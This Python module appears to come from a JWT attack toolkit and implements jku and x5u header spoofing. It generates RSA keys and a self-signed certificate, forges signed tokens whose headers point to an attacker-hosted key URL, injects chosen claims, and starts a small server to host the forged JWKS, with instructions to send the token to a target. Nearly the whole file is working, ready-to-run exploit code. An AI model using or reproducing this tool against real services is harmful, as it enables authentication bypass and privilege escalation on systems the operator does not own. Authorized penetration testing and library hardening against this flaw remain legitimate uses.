"""
Attack 5: jku / x5u Header Spoofing
-------------------------------------
jku (JWK Set URL) and x5u (X.509 Certificate URL) headers tell the
verifier WHERE to fetch the public key. If the library follows these
URLs without validation, we can host our own JWKS and forge tokens.

Attack flow:
  1. Generate an RSA keypair
  2. Build a JWKS with our public key
  3. Forge a token with jku pointing to our server
  4. Sign with our private key
  5. Server fetches our JWKS → validates successfully

Requires: cryptography library
Optional: Built-in mini HTTP server to serve the JWKS
"""

import json
import os
import threading
import http.server
import socketserver
import tempfile
from .utils import decode_token, b64url_encode


def _require_crypto():
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.backends import default_backend
        return True
    except ImportError:
        print("  [!] cryptography library required: pip install cryptography")
        return False


def generate_rsa_keypair(key_size: int = 2048) -> tuple:
    """Generate RSA keypair. Returns (private_key_obj, public_key_obj)."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size,
        backend=default_backend()
    )
    return private_key, private_key.public_key()


def public_key_to_jwk(public_key, kid: str = "attacker-key") -> dict:
    """Convert RSA public key to JWK dict."""
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey
    import base64

    pub_numbers = public_key.public_key().public_numbers() if hasattr(public_key, 'private_bytes') else public_key.public_numbers()

    def int_to_b64(n):
        length = (n.bit_length() + 7) // 8
        return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()

    return {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "kid": kid,
        "n": int_to_b64(pub_numbers.n),
        "e": int_to_b64(pub_numbers.e),
    }


def sign_rs256_with_key(header: dict, payload: dict, private_key) -> str:
    """Sign JWT with RS256 using provided private key object."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as apadding
    import json

    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    sig = private_key.sign(signing_input, apadding.PKCS1v15(), hashes.SHA256())
    return f"{h}.{p}.{b64url_encode(sig)}"


def attack_jku_spoof(token: str, attacker_url: str, kid: str = "attacker-key",
                     modify_payload: dict = None) -> dict:
    """
    Forge a token with jku pointing to attacker-controlled JWKS.
    
    Args:
        token: Original JWT
        attacker_url: URL where you will host the JWKS (e.g. http://your-server/jwks.json)
        kid: Key ID to embed in both token and JWKS
        modify_payload: Claims to inject
    
    Returns dict with forged token + JWKS to serve
    """
    if not _require_crypto():
        return {}

    header, payload, _, _ = decode_token(token)
    if modify_payload:
        payload.update(modify_payload)

    priv, pub = generate_rsa_keypair()

    forged_header = {
        "alg": "RS256",
        "typ": "JWT",
        "jku": attacker_url,
        "kid": kid
    }

    jwk = public_key_to_jwk(pub, kid=kid)
    jwks = {"keys": [jwk]}
    forged_token = sign_rs256_with_key(forged_header, payload, priv)

    # Export private key PEM for reference
    from cryptography.hazmat.primitives import serialization
    priv_pem = priv.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption()
    ).decode()

    return {
        "attack": "jku_spoof",
        "forged_token": forged_token,
        "jwks_to_serve": json.dumps(jwks, indent=2),
        "jwks_url": attacker_url,
        "private_key_pem": priv_pem,
        "kid": kid,
        "instructions": [
            f"1. Host the JWKS JSON at: {attacker_url}",
            "2. Send the forged token to the target",
            "3. Server fetches your JWKS, finds the matching kid, validates successfully"
        ]
    }


def attack_x5u_spoof(token: str, attacker_url: str,
                     modify_payload: dict = None) -> dict:
    """
    Similar to jku but uses x5u (X.509 cert URL).
    Generates self-signed cert and serves it.
    """
    if not _require_crypto():
        return {}

    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime

        header, payload, _, _ = decode_token(token)
        if modify_payload:
            payload.update(modify_payload)

        priv, pub = generate_rsa_keypair()

        # Self-signed cert
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, u"attacker.com"),
        ])
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(pub)
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .sign(priv, hashes.SHA256())
        )

        cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
        priv_pem = priv.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()
        ).decode()

        forged_header = {
            "alg": "RS256",
            "typ": "JWT",
            "x5u": attacker_url,
        }

        forged_token = sign_rs256_with_key(forged_header, payload, priv)

        return {
            "attack": "x5u_spoof",
            "forged_token": forged_token,
            "cert_pem": cert_pem,
            "private_key_pem": priv_pem,
            "x5u_url": attacker_url,
            "instructions": [
                f"1. Host the certificate PEM at: {attacker_url}",
                "2. Send the forged token to the target",
                "3. Server fetches your cert, extracts public key, validates successfully"
            ]
        }
    except Exception as e:
        return {"error": str(e)}


def serve_jwks(jwks_json: str, port: int = 8888, path: str = "/jwks.json"):
    """Spin up a quick HTTP server to serve the JWKS. Runs in background thread."""
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == path or self.path == "/":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(jwks_json.encode())
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, format, *args):
            print(f"  [JWKS Server] {self.address_string()} - {format % args}")

    def _serve():
        with socketserver.TCPServer(("", port), Handler) as httpd:
            httpd.serve_forever()

    t = threading.Thread(target=_serve, daemon=True)
    t.start()
    print(f"  [*] JWKS server started on http://0.0.0.0:{port}{path}")
    print(f"  [*] Use your public IP or ngrok to expose externally")
    return t


def run(token: str, attacker_url: str, attack_type: str = "jku",
        claims: dict = None, serve: bool = False, port: int = 8888,
        verbose: bool = True) -> dict:

    if attack_type == "jku":
        result = attack_jku_spoof(token, attacker_url, modify_payload=claims)
    elif attack_type == "x5u":
        result = attack_x5u_spoof(token, attacker_url, modify_payload=claims)
    else:
        print(f"  [!] Unknown attack type: {attack_type}")
        return {}

    if not result:
        return {}

    if verbose:
        print(f"\n[*] {attack_type.upper()} SPOOFING ATTACK\n")
        print(f"  [+] Forged token:\n      {result.get('forged_token', '')[:80]}...\n")
        print(f"  [INSTRUCTIONS]")
        for step in result.get("instructions", []):
            print(f"    {step}")

        if attack_type == "jku":
            print(f"\n  [JWKS to host at {attacker_url}]")
            print(result.get("jwks_to_serve", ""))

    if serve and attack_type == "jku":
        from urllib.parse import urlparse
        parsed = urlparse(attacker_url)
        serve_jwks(result["jwks_to_serve"], port=port, path=parsed.path or "/jwks.json")
        input("\n  [*] Press ENTER to stop the server...\n")

    return result
